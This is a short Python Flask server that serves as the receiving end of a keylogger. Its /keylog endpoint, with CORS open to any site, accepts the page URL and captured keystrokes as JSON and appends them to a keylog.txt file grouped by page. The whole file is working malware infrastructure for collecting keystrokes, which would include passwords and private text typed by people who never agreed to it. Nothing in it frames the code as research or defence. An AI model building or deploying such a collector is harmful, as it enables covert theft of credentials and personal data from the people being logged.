from flask import *
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

now = ''

@app.route('/keylog', methods=['POST'])
def keylog():
    data = request.json
    url = data['url']
    keys = data['keys']
    print(f'{url}: {keys}')
    log = open('./keylog.txt', 'a')
    global now
    print("now = " + now)
    if now == url:
        log.write('Keys : ' + keys + '\n')
    else:
        now = url
        log.write('Now in page : ' + url + '\n')
        log.write('Keys : ' + keys + '\n')
    log.close()
    return "OK"

app.run(host='127.0.0.1', port=8000, debug=True)